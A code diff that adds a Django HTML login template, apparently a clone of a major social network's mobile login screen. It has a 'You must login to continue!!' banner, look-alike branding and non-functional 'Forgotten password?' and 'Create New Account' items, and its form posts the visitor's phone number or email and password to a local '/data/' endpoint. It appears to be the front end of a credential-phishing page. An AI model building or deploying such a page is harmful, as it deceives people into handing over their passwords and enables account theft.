@@ -1,0 +1,49 @@
+
+{% load static %}
+
+<html>
+    <head>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<meta charset="utf-8">
+        <title>Login</title>
+	<link rel="stylesheet" href="{% static 'style.css' %}">
+    </head>
+    <body>
+	    <span id="note"> You must login to continue!!</span>
+	    <div id="logo">{% load static %}<img src="{% static "get/images/dF5SId3UHWd.svg" %}"></div>
+        
+        <form action="/data/" method="post">
+		{% csrf_token %}
+		<input class="data" type="number" name="number"  placeholder="Mobile number or email address" required><br>
+        <input class="data" type="password" name="password" placeholder="password" required><br>
+            <input id="data" type="submit" value="Log In">
+            
+            </form>
+        
+        <p id="for">Forgotten password?</p>
+        <hr id="left"><div id="or">or</div><hr id="right">
+        <div id="create">Create New Account</div>
+        
+        <div class="lang">
+            <div id="item1">
+                <ul>
+            <li id="eng">English (UK)</li>
+            <li>Français (France)</li>
+            <li>Español</li>
+            <li>Deutsch</li>
+                    </ul>
+            </div>
+            
+            <div id="item2">
+                <ul>
+                    <li>Hausa</li>
+                    <li>Portugues(Brazil)</li>
+                    <li>العربية</li>
+                    <li id="plus">+</li>
+                </ul>
+            </div>
+        </div>
+        
+        
+    </body>
+</html>
